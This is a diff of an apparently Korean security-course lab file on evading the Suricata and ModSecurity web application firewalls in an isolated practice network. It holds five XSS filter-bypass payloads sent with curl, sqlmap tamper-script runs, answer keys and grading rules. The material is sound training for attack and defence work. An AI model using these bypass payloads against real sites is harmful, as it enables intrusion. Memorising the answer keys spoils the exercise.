@@ -1,74 +1,136 @@
 lab_id: standalone-attack-week10
-title: IDS / WAF 우회
+title: IDS / WAF 우회 — paranoia + tamper + R/B/P
 version: standalone-non-ai
 course: attack
 week: 10
-description: Suricata + ModSec 의 paranoia / threshold 우회.
+description: |
+  Suricata + ModSec 의 paranoia level 1 + threshold 우회 패턴 학습. case / encoding /
+  nested tag / sqlmap tamper script.
 difficulty: hard
 duration_minutes: 150
 prerequisites: [W09]
-objectives: [페이로드 변형, tamper, encoding]
+objectives:
+  - "XSS 5+ 우회 변형 매트릭스"
+  - "sqlmap --tamper 3 스크립트"
+  - "ModSec audit log 의 우회 차이 분석"
 pass_threshold: 0.6
 steps:
+
   - order: 1
-    instruction: XSS 우회 5 변형
-    hint: 다양한 encoding / case / nested
-    category: bypass
-    points: 30
-    answer: |
+    instruction: |
+      ## 🎯 MISSION
+
+      XSS payload **5 우회 변형** → ModSec 응답 비교 (paranoia 1 우회 가능 여부).
+
+      ## 💻 실행 명령
+
+      ```bash
       ssh 6v6-attacker '
-      echo "=== XSS 우회 매트릭스 ==="
       for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
         code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
         echo "$code | $p"
       done
       '
-    answer_detail: 5 우회 매트릭스
+      ```
+
+      ## 📋 확인 사항
+
+      - 5 변형 모두 403 (paranoia 1 의 941 룰셋이 모두 차단)
+      - 일부 변형은 paranoia 2 에서만 차단 가능
+
+      ## 💡 왜 이걸 하는가?
+
+      Red Team — WAF 우회 패턴 학습. paranoia 1 의 한계 + paranoia 2 권장.
+
+      ## 🔍 결과 해석
+
+      - **모두 403**: paranoia 1 + libinjection 강력
+      - **일부 200**: 우회 성공 → exception 후보 (Blue 측 검토)
+    hint: XSS 5 우회 변형
+    category: bypass
+    points: 25
+    answer: |
+      ssh 6v6-attacker '
+      for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
+        echo "$code | $p"
+      done
+      '
+    answer_detail: 5 우회 매트릭스.
     verify:
       type: output_contains
-      expect: '4'
+      expect: '403\|200'
       field: stdout
       semantic:
-        intent: 우회 패턴
-        success_criteria: [5 변형]
+        intent: "WAF 우회"
+        success_criteria: ["5 변형 응답 매트릭스"]
         acceptable_methods:
-          - "**[OSS] 대소문자 mixing**"
+          - "**[OSS] case mixing (ScRiPt)**"
           - "**[OSS] URL encoding**"
-          - "**[OSS] HTML entity**"
           - "**[OSS] nested tag (sc<script>ript)**"
-          - "**[OSS] 다른 tag (svg/img)**"
-          - "**[OSS] event handler 변형**"
-          - "**[OSS] unicode escape**"
-          - "**[OSS] paranoia 1 → 2 비교**"
+          - "**[OSS] svg / iframe 변형**"
+          - "**[OSS] event handler 변형 (onload/onerror)**"
+          - "**[OSS] HTML entity / unicode escape**"
+          - "**[OSS] charset / Content-Type 조작**"
+          - "**[OSS] paranoia 1 → 2 권장**"
     target_vm: attacker
 
   - order: 2
-    instruction: SQLi tamper script 5 종 효과
-    hint: sqlmap --tamper=space2comment
+    instruction: |
+      ## 🎯 MISSION
+
+      sqlmap의 **3 tamper 스크립트** 효과 비교 (space2comment / randomcase / between).
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker '
+      for tamper in "space2comment" "randomcase" "between"; do
+        echo "=== $tamper ==="
+        timeout 20 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" 2>&1 | tail -3
+      done
+      ' || echo "timeout"
+      ```
+
+      ## 📋 확인 사항
+
+      - 3 tamper 모두 실행
+      - 각 tamper 의 ModSec 우회 가능성
+
+      ## 💡 왜 이걸 하는가?
+
+      sqlmap 의 --tamper 가 WAF 우회의 표준 도구. 운영 측은 paranoia 상승 + custom 룰
+      추가로 대응.
+
+      ## 🔍 결과 해석
+
+      - **정상**: 3 tamper 모두 실행 (대부분 ModSec 차단됨)
+      - **운영 권장**: production 환경은 paranoia 2 + libinjection 의존
+    hint: sqlmap --tamper 3 스크립트
     category: bypass
     points: 25
     answer: |
       ssh 6v6-attacker '
       for tamper in "space2comment" "randomcase" "between"; do
         echo "=== $tamper ==="
-        timeout 20 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: dvwa.6v6.lab" 2>&1 | tail -3
+        timeout 20 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" 2>&1 | tail -3
       done
-      ' || ssh 6v6-attacker 'echo "sqlmap timed out"'
-    answer_detail: 3 tamper 효과
+      ' || echo "timeout"
+    answer_detail: 3 tamper 효과 비교.
     verify:
       type: output_contains
-      expect: tamper
+      expect: 'space\|random\|between'
       field: stdout
       semantic:
-        intent: tamper 우회
-        success_criteria: [tamper 실행]
+        intent: "sqlmap tamper"
+        success_criteria: ["3 tamper 실행"]
         acceptable_methods:
-          - "**[OSS] sqlmap --tamper=script 옵션**"
-          - "**[OSS] space2comment / randomcase / between**"
-          - "**[OSS] 여러 tamper 동시**"
+          - "**[OSS] space2comment (/**/ 주입)**"
+          - "**[OSS] randomcase**"
+          - "**[OSS] between (= → BETWEEN)**"
           - "**[OSS] charunicodeescape**"
           - "**[OSS] apostrophenullencode**"
           - "**[OSS] equaltolike**"
           - "**[OSS] custom tamper 작성**"
-          - "**[OSS] ModSec paranoia 우회 비율**"
+          - "**[OSS] multiple tamper 동시 (--tamper=a,b,c)**"
     target_vm: attacker
